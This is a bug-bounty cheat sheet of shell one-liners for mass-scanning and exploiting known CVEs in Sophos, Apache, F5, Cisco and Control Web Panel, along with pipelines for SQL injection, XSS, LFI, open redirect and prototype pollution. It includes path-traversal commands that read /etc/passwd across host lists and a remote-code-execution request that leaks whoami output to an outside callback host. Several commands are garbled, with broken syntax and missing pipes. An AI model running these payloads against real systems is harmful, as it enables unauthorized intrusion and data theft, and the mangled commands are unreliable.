# BY: h0tak88r
# CVE’s

## #Nuclie

```bash
cat dorks.txt| uncover — silent | httpx — silent | nuclei -t /nuclei-templates/cves
```

## #CVE-2022-1040

```bash
curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"👽":"TEST"\}"
```

## #CVE-2021-41773 POC

```bash
cat subdomains.txt | while read host; do curl -m 10 -sS --silent --path-as-is --insecure "https://$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host ==> Vulnerable" >lol.txt || echo "$host ==>Not Vulnerable"; done
```

## #CVE-2020-5902

```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port separator " " | awk '{print $1":"$2}' | while read host do ;do curl silent-path-as-is--insecure 
"https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp? fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done
```

## #CVE-2020-3452

```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table? type=mst&textdomain=/+CSCOE+/portal_inc.lua&default-language&lang=../" | head | grep -q "cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "${RED} NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
```

## #CVE-2022-0378

```bash
cat file.txt | while read h do;do curl -sk --insecure  "https://$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && \echo "$h \033[0;31mVul\n" || echo "$h \033[0;32mNot\n";done
```

### **[CVE](https://twitter.com/hashtag/CVE?src=hashtag_click)**-2022-44877 Control **Web** Panel Unauth [#RCE](https://twitter.com/hashtag/RCE?src=hashtag_click)

```html
POST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1
Host: vuln
Content-Type: application/x-www-form-urlencoded

username=root&password=toor&commit=Login
```

# # Scanning Automation

```bash
**while true; do subfinder -dL domains.txt -all | anew subs.txt | httpx | nuclei -t nuclei-templates/ | notify ; sleep 3600; done**
```

# #SQLI

```bash
[+] findomain -t testphp.vulnweb.com -q |httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```

# #**XSS**

```bash
[+] waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u tee FILE.txt && catFILE.txt❘dalfox -b YOURS.xss.ht pipe > OUT.txt
[+] cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:\\") message(?: '|\")"
[+] gospider -S URLS.txt -c 10 d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other- source | grep -e "code-200" | awk '{print $5}' grep "=" qsreplace -a | dalfox pipe | tee OUT.txt
```

# **#LFI**

```bash
[+] gau HOST -s "" | gf lfi | qsreplace "/etc/passwd" | xargs -1% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"
```

# #Open Redirects

```bash
[+] export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST"| xargs -I %
-P 25 sh -c 'curl -Is "" 2>&1 | grep -q "Location: $LHOST" && echo "VULN!٪"'
[+] cat URLS.txt❘ gf url | tee url-redirect.txt && cat url-redirect.txt | parallel - 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

# #Prototype Pollution

```bash
subfinder -d HOST -all -silent ❘ httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?_proto_[testparam]=exploit\//' FILE.txt | page- fetch -j 'window.testparam == "exploit"? "[VULNERABLE]": "[NOT VULNERABLE]" | sed "s/(//g" sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

# #Find JavaScript Files

```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css.png|.jpeg|.jpg|.svg|.gif].wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9_]+" | sed -e 's, 'var', '"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'): echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```

# #Extract Endpoints from JavaScript

```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]&\""| sed -e 's/^"//' -e 's/"$//' | sort -u
```

# #Get CIDR & Org Information from Target Lists

```bash
for HOST in $(cat HOSTS.txt); do echo (for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " | paste -; d
one | uniq); done
```
